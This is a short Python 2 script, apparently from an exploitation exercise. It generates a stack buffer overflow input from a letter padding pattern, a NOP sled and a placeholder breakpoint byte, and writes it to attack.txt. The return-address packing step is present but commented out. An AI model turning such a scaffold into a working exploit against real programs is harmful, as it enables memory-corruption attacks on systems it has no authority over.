#!/usr/bin/env python2

import string
import struct
import os

class Char_alfa:
    def __init__(self):
        self.char_1()

 #       self.str_uct()
        self.NO_OP()
        self.payload()
        self.attack()
        self.file()
    def char_1(self):
        input = int(raw_input("Enter THE LENGTH OF THE CHAR: "))
        self.char = ''.join((string.ascii_uppercase[i:i+1]*4)for i in range(input))
        
    def str_uct(self):
        self.ESP= struct.pack("I",0xbffff7c0+40)

    def NO_OP(self):
       self.no_op = 100*"\x90"
       
    def payload(self):
        self.payload=("\xcc")
    def attack(self):
        self.attack = self.char+self.no_op+self.payload
    def file(self):
        self.file= open("./attack.txt",'w+')
        self.file.write(self.attack)
        self.file.close()
        with open('./attack.txt','rb') as out :
            home = out.read()
            print home  
            print "[*]chick the 'attack.txt' at same path[*]"


if __name__=='__main__':
     Char_alfa()
